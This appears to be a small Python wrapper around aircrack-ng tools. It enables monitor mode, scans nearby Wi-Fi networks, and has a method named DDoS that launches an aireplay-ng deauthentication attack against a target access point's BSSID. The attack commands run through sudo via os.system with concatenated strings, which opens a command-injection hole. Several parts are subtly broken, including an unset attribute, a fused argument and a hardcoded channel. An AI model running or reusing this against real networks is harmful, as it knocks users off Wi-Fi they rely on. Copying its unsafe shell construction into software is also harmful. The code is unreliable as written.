import os
import subprocess as sp
import asyncio


class Command_Template:
    def __init__(self):
        self.command


class Airmon:
    def __init__(self, interface):
        self.interface = interface
        self.command = 'airmon-ng'

    async def monitor_mode(self):
        out = sp.check_output([self.command, 'start', self.interface])


class Airodump:
    def __init__(self, interface):
        self.interface = interface
        self.command = 'airodump-ng'

    async def general_scan(self):
        out = sp.check_output(
            [self.command, '--output-format csv', '-w', ' general_scan', self.interface])


class Aireplay:

    def __init__(self, ap):
        self.ap = ap
        self.command = 'aireplay-ng'

    async def DDoS(self, interface):
        await self.channel(interface)
        os.system('sudo ' + self.command + ' -0 10 -a ' +
                  self.ap.bssid + ' ' + interface)

        return 1

    async def channel(self, interface):
        os.system('sudo airodump-ng -c 2 ' + interface)
